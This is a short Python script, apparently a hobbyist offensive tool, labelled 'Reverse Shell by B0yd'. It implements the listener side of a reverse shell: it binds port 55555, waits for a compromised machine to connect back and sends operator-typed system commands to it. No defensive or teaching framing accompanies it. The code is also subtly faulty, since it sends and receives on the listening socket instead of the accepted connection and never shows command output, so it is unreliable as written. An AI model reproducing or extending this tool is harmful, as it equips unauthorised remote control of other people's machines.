import socket

HOST = ''
PORT = 55555

def init_socket():
    try:
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[Socket created]")
        sock.bind((HOST, PORT))
        print("[Socket bound successfully]")
        # Listen to only one client
        sock.listen(1)
        print(f"Server listening on port {PORT}")
        accept_conn()
    except socket.error as err:
        print(f"[ERROR] Unable to initialize socket \nverbose: {err}")

def accept_conn():
    print('Reverse Shell by B0yd\n')
    print('?: help\n')
    print('Reverse connections will appear here')
    conn, addr = sock.accept()
    print(f"Connected to {addr[0]}:{addr[1]}")
    handle_client(conn, addr)

def handle_client(conn, addr):
    while True:
        cmd = input('> ')
        if cmd == '?':
            help()
        elif cmd == 'exit' or cmd == 'quit':
            conn.close()
            break
        else:
            sock.send(cmd.encode('utf-8'))
            data = sock.recv(1024)


def help():
    print("""Help Menu 
    \nAll kinds of system shell commands are supported based on the OS connected to
    \nto quit type 'quit' or 'exit'""")


print("Server is starting...")
init_socket()
sock.close()